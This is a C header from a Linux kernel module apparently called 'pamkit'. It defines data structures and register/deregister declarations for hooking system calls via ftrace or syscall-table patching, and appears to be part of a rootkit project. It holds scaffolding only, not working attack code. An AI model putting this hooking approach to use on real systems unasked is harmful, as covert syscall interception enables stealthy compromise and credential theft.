#ifndef _PAMKIT_HOOKING_H
#define _PAMKIT_HOOKING_H

#include "approach.h"

#include <linux/kernel.h>
#include <linux/version.h>

#if defined(PAMKIT_FTRACE_SYSCALL_HOOKING)
#include <linux/ftrace.h>
#endif

#define SYSCALL_HOOK_DATA_DEFINE(_name, _orig_function, _hook_function, _tbl_index)             \
    {                                                                                           \
        .name = (char *) (_name),                                                               \
        .orig_function_addr = (uintptr_t *) (_orig_function),                                   \
        .hook_function_addr = (void *) (_hook_function),                                        \
        .syscall_table_index = (unsigned long) (_tbl_index)                                     \
    }

#define SYSCALL_HOOK_DATA_EMPTY SYSCALL_HOOK_DATA_DEFINE(NULL, NULL, NULL, -1)

struct hook_data {
    char *name;

    uintptr_t *orig_function_addr;
    void *hook_function_addr;

    unsigned long syscall_table_index;

    #if defined(PAMKIT_SWITCH_PATCHING_SYSCALL_HOOKING)
    /* Offset that is used to compute the address of the original syscall implementation */
    int32_t original_offset;
    /* Memory address where we have to write the 'original_offset' to when restoring the original syscall */
    void *offset_memory_addr;
    #endif

    #if defined(PAMKIT_FTRACE_SYSCALL_HOOKING)
    bool installed;
    struct ftrace_ops fops;
    #endif
};
typedef struct hook_data hook_data_t;


int register_system_call_hooks(hook_data_t syscall_hooks[]);

int deregister_system_call_hooks(hook_data_t syscall_hooks[]);

#endif /* _PAMKIT_HOOKING_H */
